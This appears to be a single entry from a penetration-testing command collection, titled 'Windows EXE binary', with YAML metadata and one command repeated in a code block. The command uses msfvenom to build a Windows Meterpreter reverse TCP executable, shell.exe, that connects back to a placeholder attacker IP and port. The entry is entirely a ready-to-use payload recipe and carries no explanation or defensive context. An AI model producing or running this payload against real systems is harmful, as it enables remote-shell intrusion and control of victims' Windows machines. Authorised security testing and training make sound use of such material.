---
id: 4ccda231-b7ba-43e1-9177-fdbb8a3c7817
name: Windows EXE binary
type: command
executor: bash
data: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> -f exe > shell.exe

  '
output: null
created_at: '2020-07-14T18:14:34.232765+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Windows EXE binary

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

```


